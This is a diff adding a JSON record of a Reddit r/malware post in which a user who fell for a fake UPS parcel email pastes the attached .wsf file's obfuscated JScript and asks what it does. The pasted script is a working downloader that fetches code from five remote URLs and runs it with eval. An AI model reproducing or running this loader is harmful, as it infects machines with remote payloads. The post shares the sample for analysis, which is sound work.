@@ -1,0 +1,21 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "Nice job of social engineering! I fell for it: I got an email saying that a parcel from UPS was waiting to be picked up. Since I am expecting the parcel, I clicked on it and opened the attached .zip file. It had a zzzzz.doc.wsf file.\n\nSince I am running Linux and Firefox (with NoScript) I think I'm safe, but I'd like to know what this would do anyway.  Actually, Noscript doesn't seem to block javascript that originates from my own machine! \n\nWhen I opened this, it has the following: \n\n    &lt;job&gt;&lt;script language=JScript&gt;var t = 50; var r = \"Msxml2.XMLHTTP\"; var te307 = \"C\";  var d = 0; var te595 = \"F\";  var w = \"a\"; var te334 = \"D\";\n     if (d == 0) { try { var e = new ActiveXObject(r); var te851 = \"Z\";  \n    var u = \"http://pintabian.fr/counter/?a=1LYpbP6TTpQti5JdyEbByD9zGHwBDmDj9y&amp;m=739527&amp;i=rW8E95dQAjiP5UpmNNN7fd0_B44OJk19nen3LPbX4tbeZHp4piOOAjYx3WLFbIRq6oUxA9BqbXATwh5k\"; var te397 = \"F\";  e.open(\"GET\", u, false); e.send(); var te44 = \"L\";  \n    if (e.status == 4*t) { eval(e.responseText.split(\"739527\").join(w)); var te531 = \"E\";  d = 739527; }; } catch(e) { }; };\n    if (d == 0) { try { var e = new ActiveXObject(r); var u = \"http://residenzagliulivi.eu/counter/?a=1LYpbP6TTpQti5JdyEbByD9zGHwBDmDj9y&amp;m=343005&amp;i=rW8E95dQAjiP5UpmNNN7fd0_B44OJk19nen3LPbX4tbeZHp4piOOAjYx3WLFbIRq6oUxA9BqbXATwh5k\"; var te801 = \"D\";  e.open(\"GET\", u, false); var te336 = \"W\";  e.send(); \n    if (e.status == 4*t) { eval(e.responseText.split(\"343005\").join(w)); d = 343005; }; var te301 = \"R\";  } catch(e) { }; }; var te706 = \"G\";\n     if (d == 0) { try { var e = new ActiveXObject(r); var te540 = \"K\";  var u = \"http://rs-moto.ru/counter/?a=1LYpbP6TTpQti5JdyEbByD9zGHwBDmDj9y&amp;m=505350&amp;i=rW8E95dQAjiP5UpmNNN7fd0_B44OJk19nen3LPbX4tbeZHp4piOOAjYx3WLFbIRq6oUxA9BqbXATwh5k\"; var te583 = \"X\";  e.open(\"GET\", u, false); e.send(); \n    if (e.status == 4*t) { eval(e.responseText.split(\"505350\").join(w)); var te852 = \"Y\";  d = 505350; }; } catch(e) { }; };\n    if (d == 0) { try { var e = new ActiveXObject(r); var u = \"http://tangopostale.com/counter/?a=1LYpbP6TTpQti5JdyEbByD9zGHwBDmDj9y&amp;m=871892&amp;i=rW8E95dQAjiP5UpmNNN7fd0_B44OJk19nen3LPbX4tbeZHp4piOOAjYx3WLFbIRq6oUxA9BqbXATwh5k\"; e.open(\"GET\", u, false); var te894 = \"T\";  e.send();\n    if (e.status == 4*t) { eval(e.responseText.split(\"871892\").join(w)); var te104 = \"R\";  d = 871892; }; var te807 = \"O\";  } catch(e) { }; }; var te649 = \"G\";\n     if (d == 0) { try { var e = new ActiveXObject(r); var te595 = \"W\";  var u = \"http://zukergames.com/counter/?a=1LYpbP6TTpQti5JdyEbByD9zGHwBDmDj9y&amp;m=609589&amp;i=rW8E95dQAjiP5UpmNNN7fd0_B44OJk19nen3LPbX4tbeZHp4piOOAjYx3WLFbIRq6oUxA9BqbXATwh5k\"; e.open(\"GET\", u, false); e.send();\n    if (e.status == 4*t) { eval(e.responseText.split(\"609589\").join(w)); d = 609589; var te503 = \"D\";  }; } catch(e) { }; var te23 = \"K\";  };&lt;/script&gt;&lt;/job&gt;",
+        "title": "Just got this disguised JS dumped on my computer.",
+        "score": 20,
+        "id": "5ow1av",
+        "commsNum": 13,
+        "timeStamp": "2017/01/19-03:20:28",
+        "author_name": "mk_gecko",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 13,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/5ow1av/just_got_this_disguised_js_dumped_on_my_computer/"
+    },
+    "posts": {}
+}
